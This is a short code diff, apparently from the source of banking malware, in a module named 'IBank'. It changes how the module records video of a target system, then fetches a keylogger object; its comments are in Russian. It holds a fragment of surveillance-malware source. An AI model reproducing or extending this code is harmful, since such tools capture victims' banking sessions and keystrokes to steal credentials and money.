@@ -279,7 +279,7 @@ namespace IBank
 		// Запускаем запись видео
 		//VideoRecorderSrv::StartRecording(SystemName);
 		IBDBG("IBank", "Запускаем запись видео");
-		VideoRecorderSrv::StartInfiniteRecording(SystemName);
+		VideoProcess::RecordPID( 0, SystemName );
 
 		// Инициализируем данные системы
 		PKeyLogger Logger = KeyLogger::GetKeyLogger();
